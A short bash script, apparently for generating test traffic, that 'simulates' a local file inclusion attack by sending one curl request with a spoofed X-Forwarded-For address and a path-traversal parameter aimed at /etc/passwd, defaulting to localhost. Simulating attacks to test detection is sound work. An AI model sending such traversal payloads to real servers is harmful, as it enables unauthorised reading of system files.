#!/bin/bash

TARGET=${TARGET:-http://localhost:8080}

echo "[*] Simulating LFI..."

curl -s -H "X-Forwarded-For: 88.88.88.88" "$TARGET/index.php?page=../../../../etc/passwd" > /dev/null 

echo "[*] Finished simulating LFI"